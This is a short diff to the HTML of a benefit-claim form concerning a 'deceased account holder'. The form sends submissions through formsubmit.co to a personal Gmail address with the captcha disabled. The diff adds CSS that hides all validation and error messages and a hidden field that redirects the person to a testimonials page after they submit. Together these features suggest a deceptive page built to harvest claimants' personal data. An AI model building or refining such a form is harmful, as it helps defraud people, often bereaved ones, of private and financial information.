@@ -10,6 +10,23 @@
 <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet" />
 <link rel="stylesheet" href="./styles.css" />
 </head>
+<style>
+  /* Hide browser validation error tooltips and messages */
+  input:invalid, select:invalid, textarea:invalid {
+    box-shadow: none !important;
+    outline: none !important;
+  }
+  /* Hide custom form status/error message */
+  #form-status, .form-status, .form-status--error, .form-status[role="status"] {
+    display: none !important;
+    visibility: hidden !important;
+    color: transparent !important;
+    height: 0 !important;
+    min-height: 0 !important;
+    margin: 0 !important;
+    padding: 0 !important;
+  }
+</style>
 <body>
 <div class="page-header">
   <div class="brand-header">
@@ -93,6 +110,7 @@
           </p>
         </div>
         <form id="benefit-claim-form" action="https://formsubmit.co/sheford23@gmail.com" method="POST">
+                    <input type="hidden" name="_next" value="claimant-testimonials.html">
           <input type="hidden" name="_captcha" value="false">
           <fieldset>
             <legend>Deceased account holder</legend>
